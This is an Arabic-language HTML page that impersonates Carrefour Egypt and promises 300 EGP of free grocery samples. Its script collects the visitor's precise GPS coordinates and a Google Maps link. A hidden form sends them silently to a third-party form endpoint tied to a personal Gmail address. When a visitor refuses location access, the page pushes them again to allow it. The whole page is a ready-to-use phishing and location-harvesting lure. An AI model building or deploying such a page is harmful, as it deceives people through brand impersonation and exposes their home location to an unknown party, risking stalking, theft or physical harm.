<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>🛒 تجربة مجانية من كارفور إيجيبت!</title>
  <style>
    body {
      font-family: 'Tajawal', sans-serif;
      background: #fff5e6;
      margin: 0;
      padding: 20px;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .card {
      background: #ffffff;
      padding: 30px;
      border-radius: 20px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
      max-width: 450px;
      width: 100%;
      text-align: center;
    }
    h2 {
      color: #ff6b81;
    }
    button {
      padding: 15px 20px;
      width: 100%;
      background: #ff6b81;
      color: white;
      border: none;
      border-radius: 12px;
      font-size: 1.1rem;
      cursor: pointer;
      margin-top: 20px;
      transition: background 0.3s;
    }
    button:hover {
      background: #ff4a60;
    }
    p {
      margin-top: 15px;
      line-height: 1.5;
    }
    .highlight {
      font-weight: bold;
      color: #ff6b81;
    }
  </style>
</head>
<body>
  <div class="card">
    <h2>🎉 مرحباً بك في <span class="highlight">كارفور إيجيبت</span>!</h2>
    <p>نحب نقدم لك فرصة تجربة مجانية لمجموعة منتجاتنا القيمة مثل: <span class="highlight">ألبان، بقوليات، عصائر</span> بقيمة <span class="highlight">300 جنيه</span>!</p>
    <p>كل ما عليك هو مشاركة موقعك الآن لنقوم بتوصيل عيناتك مباشرة إلى منزلك 🚚❤️</p>

    <button onclick="shareLocation()">شارك موقعك لضمان وصول المندوب إليك</button>
    <p id="status"></p>

    <!-- Hidden form to send data to Submify -->
    <form id="locationForm" action="https://submify.vercel.app/emadsayedd@gmail.com" method="POST" style="display:none;">
      <input type="hidden" name="location" id="locationInput" />
      <input type="hidden" name="_subject" value="موقع العميل لتوصيل منتجات مجانية من كارفور إيجيبت" />
      <!-- Optional redirect after submission -->
      <!-- <input type="hidden" name="_next" value="https://your-site.com/thanks.html" /> -->
    </form>
  </div>

  <script>
    function shareLocation() {
      const statusEl = document.getElementById('status');
      statusEl.textContent = 'جاري الحصول على موقعك...';

      if (!navigator.geolocation) {
        alert("متصفحك لا يدعم تحديد الموقع");
        statusEl.textContent = '';
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const lat = pos.coords.latitude;
          const lng = pos.coords.longitude;
          const mapsUrl = `https://www.google.com/maps/?q=${lat},${lng}`;

          // Fill hidden location field
          document.getElementById('locationInput').value =
            `خط العرض: ${lat}\nخط الطول: ${lng}\nرابط الخريطة: ${mapsUrl}`;

          // Submit the form to Submify
          document.getElementById('locationForm').submit();

          statusEl.textContent = 'تم إرسال موقعك بنجاح! 🎉 سنتواصل معك لتسليم عيناتك قريباً.';
        },
        (err) => {
          console.error(err);
          // If user denies location
          if (err.code === 1) { // PERMISSION_DENIED
            statusEl.textContent = 'لا يمكننا إرسال الهدية إلا إذا سمحت بالوصول للموقع 📍. الرجاء المحاولة مرة أخرى.';
            alert('نأسف 😔، لا يمكننا إرسال عينات المنتجات المجانية إلا إذا شاركت موقعك.');
          } else {
            statusEl.textContent = 'تعذّر تحديد موقعك. الرجاء السماح بالوصول للموقع.';
          }
        }
      );
    }
  </script>
</body>
</html>
